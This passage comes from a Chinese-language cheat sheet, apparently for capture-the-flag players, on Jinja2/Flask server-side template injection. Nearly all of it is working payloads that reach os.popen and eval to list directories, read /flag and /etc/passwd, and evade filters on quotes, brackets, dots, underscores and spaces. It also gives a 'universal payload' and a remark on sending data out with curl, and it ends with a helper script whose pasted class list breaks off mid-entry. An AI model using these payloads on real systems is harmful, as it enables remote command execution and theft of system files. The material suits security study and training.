().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__['\u005f\u005f\u0062\u0075\u0069\u006c\u0074\u0069\u006e\u0073\u005f\u005f']['\u0065\u0076\u0061\u006c']('__import__("os").popen("ls /").read()')
### 相当于().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__['__builtins__']['eval']('__import__("os").popen("ls /").read()')

# join()函数
''.__class__.__base__.__subclasses__()[211].__init__.__globals__['o''s'].popen('cat /fla'.join("/g")).read()
```
```python
class_name = "__globals__"	#需要编码的字符串
unicode_class_name = ''.join(['\\u{:04x}'.format(ord(char)) for char in class_name])
print(unicode_class_name)
```

### 字符过滤：

```python
# 过滤[] 无法取序列索引
"".__class__.__mro__[2] == "".__class__.__mro__.__getitem__(2)
"".__class__.__mro__[2] == "".__class__.__mro__.pop(2) # 要注意pop()会删除元素
## 对于字典 可以用.代替[]访问字典内容
"".__class__.__bases__.__getitem__(0).__subclasses__().pop(59).__init__.__globals__.__builtins__.eval('__import__("os").popen("ls /").read()') == "".__class__.__bases__[0].__subclasses__()[59].__init__.__globals__['__builtins__']['eval']('__import__("os").popen("ls /").read()')

# 过滤引号，无法输入字符串
## 先获取chr()方法
chr=().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__.chr
## 再通过chr()方法拼接字符串
().__class__.__bases__.[0].__subclasses__().pop(40)(chr(47)+chr(101)+chr(116)+chr(99)+chr(47)+chr(112)+chr(97)+chr(115)+chr(115)+chr(119)+chr(100)).read()
### 等同于().__class__.__bases__[0].__subclasses__().pop(40)('/etc/passwd').read()

# 使用request对象绕过字符限制
## 例如被过滤了' " _
''.[request.args.class][request.args.base][request.args.subclasses]()[40](request.args.getpasswd).read()
### 再通过get方式传递参数: www.exm.com/?&class=__class__&bases=__bases__&subclasses=__subclasses__&getpasswd=/etc/passwd
### 等同于''.__class__.__bases__[0].__subclasses__().pop(40)('/etc/passwd').read()

config[request.values.a][request.values.b][request.values.c][request.values.d].popen(request.values.f).read()&a=class&b=init&c=globals&d=os&f=cat flag

{{(lipsum|attr(request.values.a)).get(request.values.b).popen(request.values.c).read()}}&a=__globals__&b=os&c=tac f*

word={{lipsum|attr(request.values.a)|attr(request.values.b)(request.values.c)|attr(request.values.d)(request.values.ocean)|attr(request.values.f)()}}&ocean=cat /flag&a=__globals__&b=__getitem__&c=os&d=popen&f=read

# 过滤.
## 可以通过 | 和 attr()绕过
().__class__ == ()|attr("__class__")	#不要忘记双引号
xxx.os('xxx') == xxx|attr("os")('xxx')	#不要忘记双引号

## 利用中括号绕过
''.__class__.__base__ == ''['__class__']['__base__']

## 过滤{{ }}
## 使用{% print() %}代替
## 或通过{% %}调用curl外带数据

# 过滤空格 
## 使用\n(%0a) \t(%09)代替
```

### 过滤绝大多数特殊字符

可以通过&#123;% %&#125;构造字符以及通过Jinja2过滤器得到我们需要的字符

```python
# 至少要能用 {} 、%、= 、() 、| 
# 需要能够使用 . 、 ' 、 [] 其中一个
# 切记在URL中 '%' 要使用 %25, '+' 要使用 %2B
## 数字:
{%25 set zero = self|int %25} # 0
{%25 set one = zero ** zero %25} # 1
{%25 set two = one %2B one %25} # 2
{%25 set three = one %2B two %25} # 3
{%25 set four = two * two %25} # 4
{%25 set five = one %2B four %25} # 5
{%25 set six = two * three %25} # 6
{%25 set seven = one %2B six %25} # 7
{%25 set eight = two ** three %25} # 8
{%25 set nine = three ** two %25} # 9

## 特殊字符
{%25 set underline = (({}|select|string|list)|attr('pop')(24)|string) %25} # 下划线
{%25 set d_underline = underline~underline %25} # 双下划线
{%25 set doc = app|attr(d_underline ~ 'doc' ~ d_underline)|string|list %25}
{%25 set point = doc|list|attr('pop')(26)|string %25} # 点
{%25 set space = doc|list|attr('pop')(3)|string %25} # 空格
{%25 set quote = doc|list|attr('pop')(177)|string %25} # 单引号
{%25 set d_quote = quote|list|string|list|attr('pop')(1)|string %25} # 双引号
{%25 set l_paren = doc|attr('pop')(171)|string %25} # 左圆括号
{%25 set r_paren = doc|attr('pop')(182)|string %25} # 右圆括号

## 任意字符
{%25 set percent = self|string|urlencode|first %25} # 百分号
{%25 set c = dict(c=c)|reverse|first %25} # c
{%25 set formatC = percent %2B c %25} # %c 用于格式化字符串控制

{%25 set slash = formatC%25((four~seven)|int) %25}    # 使用%c构造斜杠 /
{%25 set but = dict(buil=0,tins=0)|join %25}    # builtins
{%25 set imp = dict(imp=aa,ort=dd)|join %25}    # import
{%25 set pon = dict(po=aa,pen=dd)|join %25}    # popen
{%25 set os = dict(o=aa,s=dd)|join %25}    # os
{%25 set ca = dict(ca=aa,t=dd)|join %25}    # cat
{%25 set flg = dict(fl=aa,ag=dd)|join %25}    # flag
{%25 set ev = dict(ev=aa,al=dd)|join %25}    # eval
{%25 set red = dict(re=aa,ad=dd)|join %25}    # read
{%25 set bul = d_underline~but~d_underline %25}    # __builtins__
{%25 set payload = d_underline~imp~d_underline~l_paren~quote~os~quote~point~popen~l_paren~quote~ca~space~slash~flg~quote~r_paren~point~red %25}
```

通用Payload

```python
{%25 set zero = self|int %25}
{%25 set one = zero ** zero %25}
{%25 set two = one %2B one %25}
{%25 set three = two %2B one %25}
{%25 set four = two * two %25}
{%25 set five = four %2B one %25}
{%25 set seven = two * four - one %25}
{%25 set nine = three * three %25}
{%25 set percent = self|string|urlencode|first %25}
{%25 set c = dict(c=c)|reverse|first %25}
{%25 set formatC = percent~c %25}
{%25 set slash = formatC%25(four~seven)|int %25}
{%25 set underline = formatC%25(nine~five)|int %25}
{%25 set space = formatC%25(three~two)|int %25}
{%25 set dUnderline = underline~underline %25}
{%25 set cls = dUnderline~(dict(cla=0,ss=0)|join)~dUnderline %25}
{%25 set bas = dUnderline~(dict(ba=0,se=0)|join)~dUnderline %25}
{%25 set subc = dUnderline~(dict(subcl=0,asses=0)|join)~dUnderline %25}
{%25 set gtitm = dUnderline~(dict(ge=0,tit=0,em=0)|join)~dUnderline %25}
{%25 set iit = dUnderline~(dict(ini=0,t=0)|join)~dUnderline %25}
{%25 set glo = dUnderline~(dict(glo=0, bals=0)|join)~dUnderline %25}
{%25 set pope = dict(po=0, pen=0)|join %25}
{%25 set pld = (dict(ca=0, t=0)|join)~space~slash~(dict(fl=0, ag=0)|join) %25}
{%25 set rd = dict(re=0, ad=0)|join %25}
{%25 print({}|attr(cls)|attr(bas)|attr(subc)()|attr(gtitm)(137)|attr(iit)|attr(glo)|attr(gtitm)(pope)(pld)|attr(rd)()|escape) %25}
```

可以通过以下脚本对查询到的子类进行获取索引:

```python
import json
classes="""
[<class 'type'>, <class 'async_generator'>, <class 'int'>, <class 'bytearray_iterator'>, <class 'bytearray'>, <class 'bytes_iterator'>, <class 'bytes'>, <class 'builtin_function_or_method'>, <class 'callable_iterator'>, <class 'PyCapsule'>, <class 'cell'>, <class 'classmethod_descriptor'>, <class 'classmethod'>, <class 'code'>, <class 'complex'>, <class 'coroutine'>, <class 'dict_items'>, <class 'dict_itemiterator'>, <class 'dict_keyiterator'>, <class 'dict_valueiterator'>, <class 'dict_keys'>, <class 'mappingproxy'>, <class 'dict_reverseitemiterator'>, <class 'dict_reversekeyiterator'>, <class 'dict_reversevalueiterator'>, <class 'dict_values'>, <class 'dict'>, <class 'ellipsis'>, <class 'enumerate'>, <class 'float'>, <class 'frame'>, <class 'frozenset'>, <class 'function'>, <class 'generator'>, <class 'getset_descriptor'>, <class 'instancemethod'>, <class 'list_iterator'>, <class 'list_reverseiterator'>, <class 'list'>, <class 'longrange_iterator'>, <class 'member_descriptor'>, <class 'memoryview'>, <class 'method_descriptor'>, <class 'method'>, <class 'moduledef'>, <class 'module'>, <class 'odict_iterator'>, <class 'pickle.PickleBuffer'>, <class 'property'>, <class 'range_iterator'>, <class 'range'>, <class 'reversed'>, <class 'symtable entry'>, <class 'iterator'>, <class 'set_iterator'>, <class 'set'>, <class 'slice'>, <class 'staticmethod'>, <class 'stderrprinter'>, <class 'super'>, <class 'traceback'>, <class 'tuple_iterator'>, <class 'tuple'>, <class 'str_iterator'>, <class 'str'>, <class 'wrapper_descriptor'>, <class 'types.GenericAlias'>, <class 'anext_awaitable'>, <class 'async_generator_asend'>, <class 'async_generator_athrow'>, <class 'async_generator_wrapped_value'>, <class 'coroutine_wrapper'>, <class 'InterpreterID'>, <class 'managedbuffer'>, <class 'method-wrapper'>, <class 'types.SimpleNamespace'>, <class 'NoneType'>, <class 'NotImplementedType'>, <class 'weakref.CallableProxyType'>, <class 'weakref.ProxyType'>, <class 'weakref.ReferenceType'>, <class 'types.UnionType'>, <class 'EncodingMap'>, <class 'fieldnameiterator'>, <class 'formatteriterator'>, <class 'BaseException'>, <class 'hamt'>, <class 'hamt_array_node'>, <class 'hamt_bitmap_node'>, <class 'hamt_collision_node'>, <class 'keys'>, <class 'values'>, <class 'items'>, <class '_contextvars.Context'>, <class '_contextvars.ContextVar'>, <class '_contextvars.Token'>, <class 'Token.MISSING'>, <class 'filter'>, <class 'map'>, <class 'zip'>, <class '_frozen_importlib._ModuleLock'>, <class '_frozen_importlib._DummyModuleLock'>, <class '_frozen_importlib._ModuleLockManager'>, <class '_frozen_importlib.ModuleSpec'>, <class '_frozen_importlib.BuiltinImporter'>, <class '_frozen_importlib.FrozenImporter'>, <class '_frozen_importlib._ImportLockContext'>, <class '_thread.lock'>, <class '_thread.RLock'>, <class '_thread._localdummy'>, <class '_thread._local'>, <class '_io._IOBase'>, <class '_io._BytesIOBuffer'>, <class '_io.IncrementalNewlineDecoder'>, <class 'posix.ScandirIterator'>, <class 'posix.DirEntry'>, <class '_frozen_importlib_external.WindowsRegistryFinder'>, <class '_frozen_importlib_external._LoaderBasics'>, <class '_frozen_importlib_external.FileLoader'>, <class '_frozen_importlib_external._NamespacePath'>, <class '_frozen_importlib_external._NamespaceLoader'>, <class '_frozen_importlib_external.PathFinder'>, <class '_frozen_importlib_external.FileFinder'>, <class 'codecs.Codec'>, <class 'codecs.IncrementalEncoder'>, <class 'codecs.IncrementalDecoder'>, <class 'codecs.StreamReaderWriter'>, <class 'codecs.StreamRecoder'>, <class '_abc._abc_data'>, <class 'abc.ABC'>, <class 'collections.abc.Hashable'>, <class 'collections.abc.Awaitable'>, <class 'collections.abc.AsyncIterable'>, <class 'collections.abc.Iterable'>, <class 'collections.abc.Sized'>, <class 'collections.abc.Container'>, <class 'collections.abc.Callable'>, <class 'os._wrap_close'>, <class '_sitebuiltins.Quitter'>, <class '_sitebuiltins._Printer'>, <class '_sitebuiltins._Helper'>, <class '_distutils_hack._TrivialRe'>, <class '_distutils_hack.DistutilsMetaFinder'>, <class '_distutils_hack.shim'>, <class 'types.DynamicClassAttribute'>, <class 'types._GeneratorWrapper'>, <class 'warnings.WarningMessage'>, <class 'warnings.catch_warnings'>, <class 'importlib._abc.Loader'>, <class 'itertools.accumulate'>, <class 'itertools.combinations'>, <class 'itertools.combinations_with_replacement'>, <class 'itertools.cycle'>, <class 'itertools.dropwhile'>, <class 'itertools.takewhile'>, <class 'itertools.islice'>, <class 'itertools.starmap'>, <class 'itertools.chain'>, <class 'itertools.compress'>, <class 'itertools.filterfalse'>, <class 'itertools.count'>, <class 'itertools.zip_longest'>, <class 'itertools.pairwise'>, <class 'itertools.permutations'>, <class 'itertools.product'>, <class 'itertools.repeat'>, <class 'itertools.groupby'>, <class 'itertools._grouper'>, <class 'itertools._tee'>, <class 'itertools._tee_dataobject'>, <class 'operator.attrgetter'>, <class 'operator.itemgetter'>, <class 'operator.methodcaller'>, <class 'reprlib.Repr'>, <class 'collections.deque'>, <class '_collections._deque_iterator'>, <class '_collections._deque_reverse_iterator'>, <class '_collections._tuplegetter'>, <class 'collections._Link'>, <class 'functools.partial'>, <class 'functools._lru_cache_wrapper'>, <class 'functools.KeyWrapper'>, <class 'functools._lru_list_elem'>, <class 'functools.partialmethod'>, <class 'functools.singledispatchmethod'>, <class 'functools.cached_property'>, <class 'contextlib.ContextDecorator'>, <class 'contextlib.AsyncContextDecorator'>, <class 'contextlib._GeneratorContextManagerBase'>, <class 'contextlib._BaseExitStack'>, <class 'enum.auto'>, <enum 'Enum'>, <class 're.Pattern'>, <class 're.Match'>, <class '_sre.SRE_Scanner'>, <class 'sre_parse.State'>, <class 'sre_parse.SubPattern'>, <class 'sre_parse.Tokenizer'>, <class 're.Scanner'>, <class 'tokenize.Untokenizer'>, <class 'traceback._Sentinel'>, <class 'traceback.FrameSummary'>, <class 'traceback.TracebackException'>, <class 'ast.AST'>, <class 'ast.NodeVisitor'>, <class 'dis.Bytecode'>, <class 'inspect.BlockFinder'>, <class 'inspect._void'>, <class 'inspect._empty'>, <class 'inspect.Parameter'>, <class 'inspect.BoundArguments'>, <class 'inspect.Signature'>, <class '_weakrefset._IterationGuard'>, <class '_weakrefset.WeakSet'>, <class 'weakref.finalize._Info'>, <class 'weakref.finalize'>, <class 'string.Template'>, <class 'string.Formatter'>, <class 'threading._RLock'>, <class 'threading.Condition'>, <class 'threading.Semaphore'>, <class 'threading.Event'>, <class 'threading.Barrier'>, <class 'threading.Thread'>, <class 'logging.LogRecord'>, <class 'logging.PercentStyle'>, <class 'logging.Formatter'>, <class 'logging.BufferingFormatter'>, <class 'logging.Filter'>, <class 'logging.Filterer'>, <class 'logging.PlaceHolder'>, <class 'logging.Manager'>, <class 'logging.LoggerAdapter'>, <class 'urllib.parse._ResultMixinStr'>, <class 'urllib.parse._ResultMixinBytes'>, <class 'urllib.parse._NetlocResultMixinBase'>, <class 'pathlib._Flavour'>, <class 'pathlib._Accessor'>, <class 'pathlib._Selector'>, <class 'pathlib._TerminatingSelector'>, <class 'pathlib.PurePath'>, <class 'dataclasses._HAS_DEFAULT_FACTORY_CLASS'>, <class 'dataclasses._MISSING_TYPE'>, <class 'dataclasses._KW_ONLY_TYPE'>, <class 'dataclasses._FIELD_BASE'>, <class 'dataclasses.InitVar'>, <class 'dataclasses.Field'>, <class 'dataclasses._DataclassParams'>, <class 'pprint._safe_key'>, <class 'pprint.PrettyPrinter'>, <class 'zlib.Compress'>, <class 'zlib.Decompress'>, <class '_bz2.BZ2Compressor'>, <class '_bz2.BZ2Decompressor'>, <class '_lzma.LZMACompressor'>, <class '_lzma.LZMADecompressor'>, <class 'select.poll'>, <class 'select.kevent'>, <class 'select.kqueue'>, <class 'selectors.BaseSelector'>, <class 'subprocess.CompletedProcess'>, <class 'subprocess.Popen'>, <class '_random.Random'>, <class '_sha512.sha384'>, <class '_sha512.sha512'>, <class 'tempfile._RandomNameSequence'>, <class 'tempfile._TemporaryFileCloser'>, <class 'tempfile._TemporaryFileWrapper'>, <class 'tempfile.SpooledTemporaryFile'>, <class 'tempfile.TemporaryDirectory'>, <class 'numpy._globals._NoValueType'>, <class '__future__._Feature'>, <class '_json.Scanner'>, <class '_json.Encoder'>, <class 'json.decoder.JSONDecoder'>, <class 'json.encoder.JSONEncoder'>, <class 'datetime.date'>, <class 'datetime.time'>, <class 'datetime.timedelta'>, <class 'datetime.tzinfo'>, <class 'numpy.ufunc'>, <class 'numpy.dtype'>, <class 'numpy.ndarray'>, <class 'numpy.generic'>, <class 'numpy.flatiter'>, <class 'numpy.mapiter'>, <class 'numpy.broadcast'>, <class 'numpy.neigh_internal_iter'>, <class 'numpy.nditer'>, <class 'numpy.core.multiarray.flagsobj'>, <class 'numpy.busdaycalendar'>, <class 'numpy._ArrayMethod'>, <class 'numpy._BoundArrayMethod'>, <class 'numpy.compat._pep440.Infinity'>, <class 'numpy.compat._pep440.NegativeInfinity'>, <class 'numpy.compat._pep440._BaseVersion'>, <class '_struct.Struct'>, <class '_struct.unpack_iterator'>, <class '_pickle.Pdata'>, <class '_pickle.PicklerMemoProxy'>, <class '_pickle.UnpicklerMemoProxy'>, <class '_pickle.Pickler'>, <class '_pickle.Unpickler'>, <class 'pickle._Framer'>, <class 'pickle._Unframer'>, <class 'pickle._Pickler'>, <class 'pickle._Unpickler'>, <class 'numpy.compat.py3k.contextlib_nullcontext'>, <class 'numbers.Number'>, <class 'numpy.core._ufunc_config._unspecified'>, <class 'numpy.core.arrayprint.FloatingFormat'>, <class 'numpy.core.arrayprint.IntegerFormat'>, <class 'numpy.core.arrayprint.BoolFormat'>, <class 'numpy.core.arrayprint.ComplexFloatingFormat'>, <class 'numpy.core.arrayprint._TimelikeFormat'>, <class 'numpy.core.arrayprint.SubArrayFormat'>, <class 'numpy.core.arrayprint.StructuredVoidFormat'>, <class 'numpy.format_parser'>, <class 'numpy.MachAr'>, <class 'numpy.core.getlimits.MachArLike'>, <class 'numpy.finfo'>, <class 'numpy.iinfo'>, <class 'platform._Processor'>, <class 'CArgObject'>, <class '_ctypes.CThunkObject'>, <class '_ctypes._CData'>, <class '_ctypes.CField'>, <class '_ctypes.DictRemover'>, <class '_ctypes.StructParam_Type'>, <class 'ctypes.CDLL'>, <class 'ctypes.LibraryLoader'>, <class 'numpy.core._internal.dummy_ctype'>, <class 'numpy.core._internal._missing_ctypes.c_void_p'>, <class 'numpy.core._internal._missing_ctypes'>, <class 'numpy.core._internal._ctypes'>, <class 'numpy.core._internal._Stream'>, <class 'numpy._pytesttester.PytestTester'>, <class 'numpy.lib.mixins.NDArrayOperatorsMixin'>, <class 'numpy.lib.stride_tricks.DummyArray'>, <class 'numpy.vectorize'>, <class 'numpy.lib.index_tricks.nd_grid'>, <class 'numpy.lib.index_tricks.AxisConcatenator'>, <class 'numpy.ndenumerate'>, <class 'numpy.ndindex'>, <class 'numpy.lib.index_tricks.IndexExpression'>, <class 'numpy.poly1d'>, <class 'textwrap.TextWrapper'>, <class 'numpy.lib.utils._Deprecate'>, <class 'numpy.lib._datasource._FileOpeners'>, <class 'numpy.DataSource'>, <class 'numpy.lib._iotools.LineSplitter'>, <class 'numpy.lib._iotools.NameValidator'>, <class 'numpy.lib._iotools.StringConverter'>, <class 'numpy.lib.npyio.BagObj'>, <class 'numpy.lib.arrayterator.Arrayterator'>, <class 'numpy.lib._version.NumpyVersion'>, <class 'numpy.random.mtrand.RandomState'>, <class 'cython_function_or_method'>, <class 'numpy.random.bit_generator.BitGenerator'>, <class 'numpy.random.bit_generator.SeedSequence'>, <class 'numpy.random.bit_generator.SeedlessSequence'>, <class 'numpy.random.bit_generator.SeedlessSeedSequence'>, <class 'generator'>, <class 'numpy.random._common.__pyx_scope_struct____pyx_f_5numpy_6random_7_common_validate_output_shape'>, <class 'numpy.random._common.__pyx_scope_struct_1_genexpr'>, <class '_hashlib.HASH'>, <class '_hashlib.HMAC'>, <class '_blake2.blake2b'>, <class '_blake2.blake2s'>, <class 'hmac.HMAC'>, <class 'numpy.random._generator.Generator'>, <class 'numpy.random._generator.array'>, <class 'numpy.random._generator.Enum'>, <class 'numpy.random._generator.memoryview'>, <class 'numpy.ma.core._DomainCheckInterval'>, <class 'numpy.ma.core._DomainTan'>, <class 'numpy.ma.core._DomainSafeDivide'>, <class 'numpy.ma.core._DomainGreater'>, <class 'numpy.ma.core._DomainGreaterEqual'>, <class 'numpy.ma.core._MaskedUFunc'>, <class 'numpy.ma.core._MaskedPrintOption'>, <class 'numpy.ma.core.MaskedIterator'>, <class 'numpy.ma.core._frommethod'>, <class 'numpy.ma.core._convert2ma'>, <class 'numpy.ma.extras._fromnxfunction'>, <class 'typing._Final'>, <class 'typing._Immutable'>, <class 'typing._TypeVarLike'>, <class 'typing.Generic'>, <class 'typing._TypingEmpty'>, <class 'typing._TypingEllipsis'>, <class 'typing.Annotated'>, <class 'typing.NamedTuple'>, <class 'typing.TypedDict'>, <class 'typing.NewType'>, <class 'typing.io'>, <class 'typing.re'>, <class 'packaging._structures.InfinityType'>, <class 'packaging._structures.NegativeInfinityType'>, <class 'packaging.version._BaseVersion'>, <class 'matplotlib._api.deprecation.deprecate_privatize_attribute'>, <class 'matplotlib._api.deprecation._deprecated_parameter_class'>, <class 'matplotlib._api.classproperty'>, <class 'gzip._PaddedFile'>, <class 'shlex.shlex'>, <class 'matplotlib.cbook.__getattr__'>, <class 'matplotlib.cbook._StrongRef'>, <class 'matplotlib.cbook.CallbackRegistry'>, <class 'matplotlib.cbook.Stack'>, <class 'matplotlib.cbook.Grouper'>, <class 'matplotlib.cbook.GrouperView._GrouperMethodForwarder'>, <class 'matplotlib.cbook.GrouperView'>, <class 'matplotlib._docstring.Substitution'>, <class 'PIL.ImageMode.ModeDescriptor'>, <class 'PIL._util.DeferredError'>, <class 'ImagingCore'>, <class 'ImagingFont'>, <class 'ImagingDraw'>, <class 'PixelAccess'>, <class 'cffi.model.BaseTypeByIdentity'>, <class 'cffi.api.FFI'>, <class 'PIL.Image._E'>, <class 'PIL.Image.Image'>, <class 'PIL.Image.ImagePointHandler'>, <class 'PIL.Image.ImageTransformHandler'>, <class 'PIL.ImageFile.Parser'>, <class 'PIL.ImageFile.PyCodecState'>, <class 'PIL.ImageFile.PyCodec'>, <class 'array.array'>, <class 'array.arrayiterator'>, <class 'PIL.GimpGradientFile.GradientFile'>, <class 'PIL.GimpPaletteFile.GimpPaletteFile'>, <class 'PIL.PaletteFile.PaletteFile'>, <class 'PIL.ImagePalette.ImagePalette'>, <class 'PIL.ImageSequence.Iterator'>, <class 'PIL.PngImagePlugin.ChunkStream'>, <class 'PIL.PngImagePlugin.PngInfo'>, <class 'PIL.PngImagePlugin._idat'>, <class 'PIL.PngImagePlugin._fdat'>, <class 'matplotlib.bezier.BezierSegment'>, <class 'matplotlib.path.Path'>, <class 'matplotlib.transforms.TransformNode'>, <class 'matplotlib.transforms._BlendedMixin'>, <class 'matplotlib.ticker._DummyAxis'>, <class 'matplotlib.ticker.TickHelper'>, <class 'matplotlib.ticker._Edge_integer'>, <class 'matplotlib.scale.ScaleBase'>, <class 'matplotlib.colors.ColorConverter'>, <class 'matplotlib.colors.Colormap'>, <class 'matplotlib.colors.Normalize'>, <class 'matplotlib.colors.LightSource'>, <class 'pyparsing.util.__config_flags'>, <class 'pyparsing.util._UnboundedCache'>, <class 'pyparsing.util._FifoCache'>, <class 'pyparsing.util.LRUMemo'>, <class 'pyparsing.unicode._lazyclassproperty'>, <class 'pyparsing.unicode.unicode_set'>, <class 'pyparsing.actions.OnlyOnce'>, <class 'pyparsing.results._ParseResultsWithOffset'>, <class 'pyparsing.results.ParseResults'>, <class 'pyparsing.core._NullToken'>, <class 'pyparsing.testing.pyparsing_test.reset_pyparsing_context'>, <class 'pyparsing.testing.pyparsing_test.TestParseResultsAsserts'>, <class 'pyparsing.testing.pyparsing_test'>, <class 'pyparsing.common.pyparsing_common'>, <class 'cycler.Cycler'>, <class 'matplotlib.rcsetup.ValidateInStrings'>, <class 'matplotlib.__getattr__'>, <class 'matplotlib.ft2font.FT2Image'>, <class 'matplotlib.ft2font.FT2Font'>, <class 'matplotlib.ft2font.Glyph'>, <class 'kiwisolver.Variable'>, <class 'kiwisolver.Term'>, <class 'kiwisolver.Expression'>, <class 'kiwisolver.Constraint'>, <class 'kiwisolver.Strength'>, <class 'kiwisolver.Solver'>, <class 'matplotlib.cm.ScalarMappable'>, <class 'runpy._TempModule'>, <class 'runpy._ModifiedArgv0'>, <class 'markupsafe._MarkupEscapeHelper'>, <class 'jinja2.bccache.Bucket'>, <class 'jinja2.bccache.BytecodeCache'>, <class 'jinja2.utils.MissingType'>, <class 'jinja2.utils.LRUCache'>, <class 'jinja2.utils.Cycler'>, <class 'jinja2.utils.Joiner'>, <class 'jinja2.utils.Namespace'>, <class 'jinja2.nodes.EvalContext'>, <class 'jinja2.nodes.Node'>, <class 'jinja2.visitor.NodeVisitor'>, <class 'jinja2.idtracking.Symbols'>, <class 'jinja2.compiler.MacroRef'>, <class 'jinja2.compiler.Frame'>, <class 'jinja2.runtime.TemplateReference'>, <class 'jinja2.runtime.Context'>, <class 'jinja2.runtime.BlockReference'>, <class 'jinja2.runtime.LoopContext'>, <class 'jinja2.runtime.Macro'>, <class 'jinja2.runtime.Undefined'>, <class 'jinja2.lexer.Failure'>, <class 'jinja2.lexer.TokenStreamIterator'>, <class 'jinja2.lexer.TokenStream'>, <class 'jinja2.lexer.Lexer'>, <class 'jinja2.parser.Parser'>, <class 'jinja2.environment.Environment'>, <class 'jinja2.environment.Template'>, <class 'jinja2.environment.TemplateModule'>, <class 'jinja2.environment.TemplateExpression'>, <class 'jinja2.environment.TemplateStream'>, <class 'jinja2.loaders.BaseLoader'>, <class '_socket.socket'>, <class 'socketserver.BaseServer'>, <class 'socketserver.ForkingMixIn'>, <class 'socketserver._NoThreads'>, <class 'socketserver.ThreadingMixIn'>, <class 'socketserver.BaseRequestHandler'>, <class 'calendar._localized_month'>, <class 'calendar._localized_day'>, <class 'calendar.Calendar'>, <class 'calendar.different_locale'>, <class 'email._parseaddr.AddrlistClass'>, <class 'email.charset.Charset'>, <class 'email.header.Header'>, <class 'email.header._ValueFormatter'>, <class 'email._policybase._PolicyBase'>, <class 'email.feedparser.BufferedSubFile'>, <class 'email.feedparser.FeedParser'>, <class 'email.parser.Parser'>, <class 'email.parser.BytesParser'>, <class 'email.message.Message'>, <class 'http.client.HTTPConnection'>, <class '_ssl._SSLContext'>, <class '_ssl._SSLSocket'>, <class '_ssl.MemoryBIO'>, <class '_ssl.SSLSession'>, <class '_ssl.Certificate'>, <class 'ssl.SSLObject'>, <class 'mimetypes.MimeTypes'>, <class 'werkzeug._internal._Missing'>, <class 'werkzeug.exceptions.Aborter'>, <class 'urllib.request.Request'>, <class 'urllib.request.OpenerDirector'>, <class 'urllib.request.BaseHandler'>, <class 'urllib.request.HTTPPasswordMgr'>, <class 'urllib.request.AbstractBasicAuthHandler'>, <class 'urllib.request.AbstractDigestAuthHandler'>, <class 'urllib.request.URLopener'>, <class 'urllib.request.ftpwrapper'>, <class 'http.cookiejar.Cookie'>, <class 'http.cookiejar.CookiePolicy'>, <class 'http.cookiejar.Absent'>, <class 'http.cookiejar.CookieJar'>, <class 'werkzeug.datastructures.ImmutableListMixin'>, <class 'werkzeug.datastructures.ImmutableDictMixin'>, <class 'werkzeug.datastructures._omd_bucket'>, <class 'werkzeug.datastructures.Headers'>, <class 'werkzeug.datastructures.ImmutableHeadersMixin'>, <class 'werkzeug.datastructures.IfRange'>, <class 'werkzeug.datastructures.Range'>, <class 'werkzeug.datastructures.ContentRange'>, <class 'werkzeug.datastructures.FileStorage'>, <class 'werkzeug.sansio.multipart.Event'>, <class 'werkzeug.sansio.multipart.MultipartDecoder'>, <class 'werkzeug.sansio.multipart.MultipartEncoder'>, <class 'pkgutil.ImpImporter'>, <class 'pkgutil.ImpLoader'>, <class 'unicodedata.UCD'>, <class 'werkzeug.wsgi.ClosingIterator'>, <class 'werkzeug.wsgi.FileWrapper'>, <class 'werkzeug.wsgi._RangeWrapper'>, <class 'werkzeug.formparser.FormDataParser'>, <class 'werkzeug.formparser.MultiPartParser'>, <class 'werkzeug.user_agent.UserAgent'>, <class 'werkzeug.sansio.request.Request'>, <class 'werkzeug.sansio.response.Response'>, <class 'werkzeug.wrappers.response.ResponseStream'>, <class 'werkzeug.test._TestCookieHeaders'>, <class 'werkzeug.test._TestCookieResponse'>, <class 'werkzeug.test.EnvironBuilder'>, <class 'werkzeug.test.Client'>, <class 'werkzeug.local.Local'>, <class 'werkzeug.local.LocalManager'>, <class 'werkzeug.local._ProxyLookup'>, <class 'flask.globals._FakeStack'>, <class 'decimal.Decimal'>, <class 'decimal.Context'>, <class 'decimal.SignalDictMixin'>, <class 'decimal.ContextManager'>, <class 'uuid.UUID'>, <class 'flask.json.provider.JSONProvider'>, <class 'gettext.NullTranslations'>, <class 'click._compat._FixupStream'>, <class 'click._compat._AtomicFile'>, <class 'click.utils.LazyFile'>, <class 'click.utils.KeepOpenFile'>, <class 'click.utils.PacifyFlushWrapper'>, <class 'click.types.ParamType'>, <class 'click.parser.Option'>, <class 'click.parser.Argument'>, <class 'click.parser.ParsingState'>, <class 'click.parser.OptionParser'>, <class 'click.formatting.HelpFormatter'>, <class 'click.core.Context'>, <class 'click.core.BaseCommand'>, <class 'click.core.Parameter'>, <class 'werkzeug.routing.converters.BaseConverter'>, <class 'difflib.SequenceMatcher'>, <class 'difflib.Differ'>, <class 'difflib.HtmlDiff'>, <class 'werkzeug.routing.rules.RulePart'>, <class 'werkzeug.routing.rules.RuleFactory'>, <class 'werkzeug.routing.rules.RuleTemplate'>, <class 'werkzeug.routing.matcher.State'>, <class 'werkzeug.routing.matcher.StateMachineMatcher'>, <class 'werkzeug.routing.map.Map'>, <class 'werkzeug.routing.map.MapAdapter'>, <class 'flask.signals.Namespace'>, <class 'flask.signals._FakeSignal'>, <class 'flask.cli.ScriptInfo'>, <class 'flask.config.ConfigAttribute'>, <class 'flask.ctx._AppCtxGlobals'>, <class 'flask.ctx.AppContext'>, <class 'flask.ctx.RequestContext'>, <class 'flask.scaffold.Scaffold'>, <class 'itsdangerous.signer.SigningAlgorithm'>, <class 'itsdangerous.signer.Signer'>, <class 'itsdangerous.serializer.Serializer'>, <class 'itsdangerous._json._CompactJSON'>, <class 'flask.json.tag.JSONTag'>, <class 'flask.json.tag.TaggedJSONSerializer'>, <class 'flask.sessions.SessionInterface'>, <class 'flask.blueprints.BlueprintSetupState'>, <class '_csv.Dialect'>, <class '_csv.reader'>, <class '_csv.writer'>, <class 'csv.Dialect'>, <class 'csv.DictReader'>, <class 'csv.DictWriter'>, <class 'csv.Sniffer'>, <class 'zipfile.ZipInfo'>, <class 'zipfile.LZMACompressor'>, <class 'zipfile.LZMADecompressor'>, <class 'zipfile._SharedFile'>, <class 'zipfile._Tellable'>, <class 'zipfile.ZipFile'>, <class 'zipfile.Path'>, <class 'importlib.abc.Finder'>, <class 'importlib.abc.MetaPathFinder'>, <class 'importlib.abc.PathEntryFinder'>, <class 'importlib.abc.ResourceReader'>, <class 'importlib.metadata.Sectioned'>, <class 